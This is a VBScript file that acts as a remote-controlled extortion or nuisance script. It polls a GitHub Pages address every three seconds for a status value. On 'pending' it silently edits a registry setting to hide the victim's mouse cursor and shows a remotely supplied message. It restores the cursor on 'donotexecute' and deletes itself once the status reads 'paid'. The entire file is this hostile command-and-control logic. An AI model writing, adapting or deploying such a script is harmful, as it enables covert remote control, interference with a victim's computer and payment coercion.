Option Explicit

Set shell = CreateObject("WScript.Shell")

Dim delay
delay = 1

Dim url
url = "https://tanjim750.github.io/remotecontrol/"

Dim loopCondition
loopCondition = True

Do While loopCondition
    Dim response, status_input, text_input, status_value, text
    Set response = CreateObject("MSXML2.XMLHTTP")
    
    On Error Resume Next
    response.open "GET", url, False
    response.send
    On Error Goto 0
    
    If response.status = 200 Then
        Dim html
        html = response.responseText
        
        Dim htmlDocument
        Set htmlDocument = CreateObject("HTMLFile")
        htmlDocument.write html
        htmlDocument.close
        
        Set status_input = htmlDocument.getElementById("status1")
        Set text_input = htmlDocument.getElementById("text1")
        
        If Not status_input Is Nothing Then
            status_value = status_input.value
        End If
        
        If Not text_input Is Nothing Then
            text = text_input.innerText
        End If
    End If
    
    If status_value = "pending" Then

        shell.Run "C:\Windows\System32\reg.exe ADD HKCU\Control Panel\Desktop /v MouseTrail /t REG_SZ /d -1 /f", 0, True

	shell.Popup text, 0, "Message", vbInformation	

        
    ElseIf status_value = "loop" Then
       loopCondition = True
        
    ElseIf status_value = "donotexecute" Then

        shell.Run "C:\Windows\System32\reg.exe ADD HKCU\Control Panel\Desktop /v MouseTrail /t REG_SZ /d 0 /f", 0, True

		
        WScript.Quit
        
    ElseIf status_value = "paid" Then
        Set objFSO = CreateObject("Scripting.FileSystemObject")

		' Get the path of the current VBScript file
		filePath = WScript.ScriptFullName

		' Delete the file
		objFSO.DeleteFile(filePath)
        
    Else
        loopCondition = True
    End If
    
    WScript.Sleep (3000) ' Delay in milliseconds
Loop
